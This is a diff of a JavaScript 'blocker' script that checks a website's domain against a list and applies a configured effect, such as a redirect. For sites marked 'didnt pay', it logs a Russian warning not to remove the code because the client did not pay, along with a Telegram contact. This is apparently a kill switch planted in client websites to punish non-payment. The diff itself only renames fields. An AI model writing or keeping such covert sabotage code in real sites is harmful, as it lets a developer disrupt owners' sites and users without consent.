@@ -54,17 +54,17 @@ const effects = {
     const currentDomain = window.location.hostname;
 
     // Находим текущий домен в списке
-    const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
+    const siteInfo = sites.find(site => currentDomain === new URL(site.blocker_url).hostname);
 
     // Применение эффекта, если домен найден в списке
-    const effectFunction = effects[siteInfo.effect];
+    const effectFunction = effects[siteInfo.blocker_effect];
     if (effectFunction) {
-        effectFunction(siteInfo.redirecturl || siteInfo.date);
+        effectFunction(siteInfo.blocker_redirecturl || siteInfo.blocker_date);
     }
         
     // Проверка, если case у домена равен "didnt pay"
-    if (siteInfo && siteInfo.cause === "didnt pay") {
-        console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
+    if (siteInfo && siteInfo.blocker_cause === "didnt pay") {
+        console.log(`Этот заказчик ${siteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
       }
   }
 
